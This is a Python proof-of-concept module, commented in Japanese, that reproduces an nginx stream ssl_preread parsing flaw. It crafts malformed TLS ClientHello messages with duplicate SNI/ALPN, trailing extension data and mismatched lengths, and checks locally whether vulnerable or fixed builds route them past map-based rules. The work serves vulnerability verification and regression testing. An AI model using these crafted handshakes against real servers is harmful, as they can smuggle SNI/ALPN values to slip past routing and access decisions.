#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-123640: stream ssl_preread 入力検証不足 自己完結再現モジュール.

公開 API:
    run(binary: str, workdir: str, host: str = "127.0.0.1") -> dict

戻り値: {"cve","configured","trigger","effect","detail"}
effect: VULNERABLE | TRIGGERED | ERROR | SKIP

概要 (修正コミット):
  d9fd14e "Stream ssl_preread: forbid duplicate SNI and ALPN"
  30b8bf6 "Stream ssl_preread: forbid trailing data in extensions"
  (両方とも 1.31.9 / 1.30.7 に含まれる。1.31.8 と 1.30.6 が脆弱)

  stream の ssl_preread パーサ (ngx_stream_ssl_preread_parse_record) は
  1.31.8 において
    1. extensions ブロック全体の宣言長 (compression_methods 直後の 2 バイト)
    2. 各拡張 (SNI / ALPN / supported_versions) の宣言データ長
    3. SNI / ALPN 拡張の重複
  を一切検証せず、「内側の list 長」だけを頼りに次の拡張位置を決めていた。
  そのため「拡張長と中身が食い違う」「SNI/ALPN が重複する」ような不正な
  ClientHello でも $ssl_preread_server_name / $ssl_preread_alpn_protocols /
  $ssl_preread_protocol が抽出され、map による振り分け (ルーティング判断) に
  使えてしまう (SNI/ALPN スマグリング、振り分けすり抜け)。

  修正版はこれらを NGX_DECLINED (malformed) として変数を設定しないため、
  同一の悪意ある ClientHello に対する振り分け先が決定的に変わる。

構成:
  - listen 127.0.0.1:18449 (stream, ssl_preread on)
  - map "$k1$k2$k3" (server_name / alpn / protocol の各キー) で
      非 default 値 (F / A / P) -> 127.0.0.1:19010 (実在バックエンド)
      default              -> 127.0.0.2:19010 (何も Listen していない = ブラックホール)
  - バックエンド 19010 は accept 直後に応答 1 行を返すだけの TCP サーバ。

  判定:
    脆弱版 (1.31.8 / 1.30.6): 不正 ClientHello でも変数が抽出され
                              非 default (実バックエンド) へ振り分けられる
    修正版 (1.31.9 / 1.30.7): NGX_DECLINED -> 変数未設定 -> default
                              (接続拒否、error_log に refused)
  バックエンドの応答有無 (および error_log の refused / "ssl preread:" debug 行)
  で決定的に判定する。

使用ポート (他タスクとの専有約束):
  18449 = stream ssl_preread リスナー / 19010 = バックエンド
  (default 振り分け先として 127.0.0.2:19010 も「ポート 19010」として使う)
"""
import json
import os
import shutil
import signal
import socket
import subprocess
import threading
import time

CVE = "CVE-2026-123640"
HOST_DEFAULT = "127.0.0.1"
P_LISTEN = 18449          # stream ssl_preread リスナー
P_BACKEND = 19010        # 実在バックエンド
BE_BLACKHOLE = "127.0.0.2:%d" % P_BACKEND   # 何も Listen していない宛先 (default 振り分け先)
BE_REAL = "127.0.0.1:%d" % P_BACKEND

CONF_TMPL = """\
worker_processes 1;
daemon on;
pid %(prefix)s/nginx.pid;
error_log %(prefix)s/logs/error.log debug;

events {
    worker_connections 128;
}

stream {
    map $ssl_preread_server_name $k1 {
        default        "";
        first.example  "F";
        second.example "S";
    }

    map $ssl_preread_alpn_protocols $k2 {
        default "";
        h2     "A";
    }

    map $ssl_preread_protocol $k3 {
        default "";
        TLSv1.3 "P";
    }

    map "$k1$k2$k3" $dst {
        default  %(blackhole)s;
        "F"      %(real)s;
        "A"      %(real)s;
        "P"      %(real)s;
        "FA"     %(real)s;
    }

    server {
        listen 127.0.0.1:%(listen_port)d;
        ssl_preread on;
        proxy_pass $dst;
    }
}
"""

GREETING = b"BACKEND-OK\n"


class Backend(threading.Thread):
    """19010/TCP: accept 直後に 1 行応答を返すだけの振り分け判定用バックエンド。"""

    def __init__(self, host, port):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.sock = None
        self.running = True
        self.hits = 0

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        ok = False
        for _attempt in range(60):
            try:
                s.bind((self.host, self.port))
                ok = True
                break
            except OSError:
                time.sleep(0.1)
        if not ok:
            return
        s.listen(128)
        s.settimeout(0.2)
        self.sock = s
        while self.running:
            try:
                c, _ = s.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            self.hits += 1
            try:
                c.sendall(GREETING)
            except OSError:
                pass
            threading.Thread(target=self._drain, args=(c,), daemon=True).start()
        try:
            s.close()
        except OSError:
            pass

    @staticmethod
    def _drain(c):
        try:
            c.settimeout(1)
            while c.recv(4096):
                pass
        except OSError:
            pass
        finally:
            try:
                c.close()
            except OSError:
                pass

    def stop(self):
        self.running = False
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass


# ---------------------------------------------------------------- ClientHello
def _u16(n):
    return n.to_bytes(2, "big")


def _extension(ext_type, data, declared_len=None):
    return _u16(ext_type) + _u16(len(data) if declared_len is None else declared_len) + data


def sni_extension(name, declared_len=None, trailing=b""):
    entry = b"\x00" + _u16(len(name)) + name
    server_name_list = _u16(len(entry)) + entry + trailing
    return _extension(0x0000, server_name_list, declared_len)


def alpn_extension(protocols, declared_len=None, trailing=b""):
    entry = b"".join(bytes([len(p)]) + p for p in protocols)
    alpn_list = _u16(len(entry)) + entry + trailing
    return _extension(0x0010, alpn_list, declared_len)


def supver_extension(versions=(b"\x03\x04",), declared_len=None, trailing=b""):
    entry = b"".join(versions)
    data = bytes([len(entry)]) + entry + trailing
    return _extension(0x002B, data, declared_len)


def client_hello(extensions, ext_total_len=None):
    """最小構成の TLS1.2 ClientHello (1 レコード)。"""
    ext_block = b"".join(extensions)
    total = len(ext_block) if ext_total_len is None else ext_total_len
    body = (b"\x03\x03" + b"\x00" * 32
            + b"\x00"
            + b"\x00\x02\x13\x01"
            + b"\x01\x00"
            + _u16(total) + ext_block)
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + _u16(len(handshake)) + handshake


DUMMY_EXT = b"\x00\x01\x00\x00"   # 不明拡張 type 1 / 長さ 0 (trailing data 用)


def build_cases():
    """name -> (ClientHello, 期待値)。

    sanity 系は脆弱版・修正版の双方で非 default (実バックエンド) に振り分けられる。
    malformed 系は脆弱版では 非 default、修正版では default (拒否) になる。
    """
    return [
        # --- sanity: 整形な ClientHello は両版で同一挙動 ---
        ("sni-valid", client_hello([sni_extension(b"first.example")]), "real"),
        ("alpn-valid", client_hello([alpn_extension([b"h2"])]), "real"),
        # --- d9fd14e: SNI / ALPN 拡張の重複 ---
        ("dup-sni", client_hello([sni_extension(b"first.example"),
                                  sni_extension(b"second.example")]), "default"),
        ("dup-alpn", client_hello([alpn_extension([b"h2"]),
                                   alpn_extension([b"http/1.1"])]), "default"),
        # --- 30b8bf6: 拡張内 trailing data ---
        ("sni-trailing", client_hello(
            [sni_extension(b"first.example", trailing=DUMMY_EXT)]), "default"),
        ("alpn-trailing", client_hello(
            [alpn_extension([b"h2"], trailing=DUMMY_EXT)]), "default"),
        ("supver-trailing", client_hello(
            [supver_extension(trailing=DUMMY_EXT)]), "default"),
        # --- 30b8bf6: 拡張ブロック宣言長の不一致 ---
        ("extlen-short", client_hello(
            [sni_extension(b"first.example")], ext_total_len=0), "default"),
        ("extlen-long", client_hello(
            [sni_extension(b"first.example")],
            ext_total_len=len(sni_extension(b"first.example")) + 100), "default"),
    ]


MALFORMED = ("dup-sni", "dup-alpn", "sni-trailing", "alpn-trailing",
             "supver-trailing", "extlen-short", "extlen-long")


def _kill_by_cmdline(tag):
    for pd in os.listdir("/proc"):
        if not pd.isdigit():
            continue
        try:
            cmd = open("/proc/%s/cmdline" % pd, "rb").read().replace(b"\0", b" ").decode("utf-8", "replace")
        except OSError:
            continue
        if tag in cmd and "nginx" in cmd:
            try:
                os.kill(int(pd), signal.SIGKILL)
            except OSError:
                pass


def _stop_nginx(prefix):
    pid = None
    try:
        pid = int(open(os.path.join(prefix, "nginx.pid")).read().strip())
    except Exception:
        pid = None
    if pid:
        try:
            os.kill(pid, signal.SIGTERM)
        except OSError:
            pass
        deadline = time.time() + 3
        while time.time() < deadline:
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                break
            time.sleep(0.05)
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass
    _kill_by_cmdline(prefix)


def _probe(port, hello, timeout=3.0):
    """ClientHello を送り、振り分け先を観測する。戻り値: real|closed|<error>"""
    try:
        s = socket.create_connection((HOST_DEFAULT, port), timeout=timeout)
    except OSError as exc:
        return "<%s>" % type(exc).__name__
    try:
        s.sendall(hello)
        s.settimeout(timeout)
        try:
            data = s.recv(64)
        except OSError as exc:
            return "<%s>" % type(exc).__name__
        if data.startswith(GREETING):
            return "real"
        if not data:
            return "closed"
        return "data:%r" % data[:32]
    finally:
        try:
            s.close()
        except OSError:
            pass


def _read_log(prefix):
    try:
        return open(os.path.join(prefix, "logs", "error.log"), errors="ignore").read()
    except OSError:
        return ""


def run(binary, workdir, host="127.0.0.1"):
    del host  # 専有ポートは 127.0.0.1 固定
    binary = os.path.abspath(binary)
    base = os.path.abspath(os.path.join(workdir, "cve-2026-123640"))
    os.makedirs(base, exist_ok=True)
    prefix = os.path.join(base, "run")
    if os.path.isdir(prefix):
        shutil.rmtree(prefix)
    os.makedirs(os.path.join(prefix, "logs"), exist_ok=True)

    result = {
        "cve": CVE,
        "configured": False,
        "trigger": ("stream ssl_preread (listen 127.0.0.1:%d) で map 振り分けを構成し、"
                    "悪意ある ClientHello (SNI/ALPN 重複・trailing data・拡張長不一致) を"
                    "送信。脆弱版は変数を抽出して非 default バックエンドへ振り分け、"
                    "修正版は NGX_DECLINED で変数未設定 -> default (接続拒否) となる差で判定。" % P_LISTEN),
        "effect": "ERROR",
        "detail": "",
    }
    backend = None
    try:
        conf = CONF_TMPL % dict(prefix=prefix, listen_port=P_LISTEN,
                                blackhole=BE_BLACKHOLE, real=BE_REAL)
        conf_path = os.path.join(prefix, "nginx.conf")
        with open(conf_path, "w") as f:
            f.write(conf)

        test = subprocess.run([binary, "-t", "-p", prefix + "/", "-c", conf_path],
                              capture_output=True, text=True, timeout=20)
        if test.returncode != 0:
            result["effect"] = "SKIP"
            result["detail"] = "nginx -t 失敗: " + (test.stderr or test.stdout).strip()
            return result
        result["configured"] = True

        backend = Backend(HOST_DEFAULT, P_BACKEND)
        backend.start()
        for _ in range(30):
            if backend.sock is not None:
                break
            time.sleep(0.05)

        proc = subprocess.run([binary, "-p", prefix + "/", "-c", conf_path],
                              capture_output=True, text=True, timeout=20)
        if proc.returncode != 0:
            result["effect"] = "ERROR"
            result["detail"] = "nginx 起動失敗: " + (proc.stderr or proc.stdout).strip()
            return result

        try:
            deadline = time.time() + 5
            while time.time() < deadline:
                try:
                    s = socket.create_connection((HOST_DEFAULT, P_LISTEN), timeout=0.3)
                    s.close()
                    time.sleep(0.2)
                    break
                except OSError:
                    time.sleep(0.05)
            else:
                raise RuntimeError("listen 127.0.0.1:%d が開かない" % P_LISTEN)

            routed = {}
            for name, hello, _expect in build_cases():
                routed[name] = _probe(P_LISTEN, hello)
                time.sleep(0.05)
            time.sleep(0.3)
        finally:
            _stop_nginx(prefix)

        log = _read_log(prefix)
        preread_lines = [ln.strip() for ln in log.splitlines() if "ssl preread:" in ln]
        refused = [ln.strip() for ln in log.splitlines()
                   if "refused" in ln or "Connection refused" in ln]

        sanity_ok = all(routed.get(n) == "real" for n in ("sni-valid", "alpn-valid"))
        vuln_accepts = all(routed.get(n) == "real" for n in MALFORMED)

        detail = [
            "prefix=%s" % prefix,
            "振り分け結果: " + json.dumps(routed, ensure_ascii=False),
            "sanity (整形 ClientHello -> 実バックエンド): %s" % ("OK" if sanity_ok else "NG"),
            "malformed ClientHello が 非 default へ振り分けられた: %s" % ("YES" if vuln_accepts else "NO"),
            "default 振り分け先 (%s) への connect 拒否ログ: %d 件" % (BE_BLACKHOLE, len(refused)),
            "ssl preread debug 行: %d 件" % len(preread_lines),
        ]
        reject_logs = [ln for ln in preread_lines
                       if ("duplicate" in ln or "error" in ln or "not a handshake" in ln
                           or "unsupported" in ln or "version 2 ClientHello" in ln)]
        if reject_logs:
            detail.append("拒否ログ例: " + reject_logs[0])
        result["detail"] = " / ".join(detail)

        if vuln_accepts:
            # 脆弱版: 不正 ClientHello を受理してルーティングに使用した
            result["effect"] = "VULNERABLE"
        elif sanity_ok:
            # 修正版: 不正 ClientHello は拒否 (default 振り分け / 接続断)
            result["effect"] = "TRIGGERED"
        else:
            result["effect"] = "ERROR"
        return result
    except Exception as exc:  # noqa: BLE001
        result["effect"] = "ERROR"
        result["detail"] = "%s: %s" % (type(exc).__name__, exc)
        return result
    finally:
        try:
            _stop_nginx(prefix)
        except Exception:  # noqa: BLE001
            pass
        if backend is not None:
            backend.stop()
        time.sleep(0.05)


# --------------------------------------------------------------- result.json
BINARIES = [
    ("vuln-1.31.8", "/app/data/sessions/conv-43/build/inst-vuln/sbin/nginx"),
    ("fixed-1.31.9", "/app/data/sessions/conv-43/build/inst-fixed/sbin/nginx"),
    ("asan-vuln-1.31.8", "/app/data/sessions/conv-43/build/inst-asan-vuln/sbin/nginx"),
    ("asan-fixed-1.31.9", "/app/data/sessions/conv-43/build/inst-asan-fixed/sbin/nginx"),
    ("vuln-1.30.6", "/app/data/sessions/conv-43/build/inst-vuln1306/sbin/nginx"),
    ("fixed-1.30.7", "/app/data/sessions/conv-43/build/inst-fixed1307/sbin/nginx"),
]


def main():
    workdir = "/app/data/sessions/conv-43/poc-run-F"
    os.makedirs(workdir, exist_ok=True)
    out = {
        "cve": CVE,
        "module": "modules/123640.py",
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "ports": {"listen": P_LISTEN, "backend": P_BACKEND},
        "workdir": workdir,
        "results": {},
    }
    for tag, path in BINARIES:
        if not os.path.isfile(path):
            out["results"][tag] = {"cve": CVE, "configured": False, "trigger": "",
                                   "effect": "SKIP", "detail": "バイナリなし: %s" % path}
            continue
        asan = "asan" in path
        old = os.umask(0) if asan else None
        try:
            res = run(path, workdir)
            run_dir = os.path.join(workdir, "cve-2026-123640", "run")
            try:
                os.chmod(run_dir, 0o777)
                os.chmod(os.path.join(run_dir, "logs"), 0o777)
            except OSError:
                pass
        finally:
            if asan:
                os.umask(old)
        out["results"][tag] = res
        print("[%s] %s" % (tag, res["effect"]), flush=True)

    summary = {}
    for tag, res in out["results"].items():
        summary[tag] = res.get("effect")
    out["summary"] = summary
    dst = os.path.join(os.path.dirname(os.path.abspath(__file__)), "123640.result.json")
    with open(dst, "w") as f:
        json.dump(out, f, ensure_ascii=False, indent=2)
    print("wrote %s" % dst, flush=True)


if __name__ == "__main__":
    main()
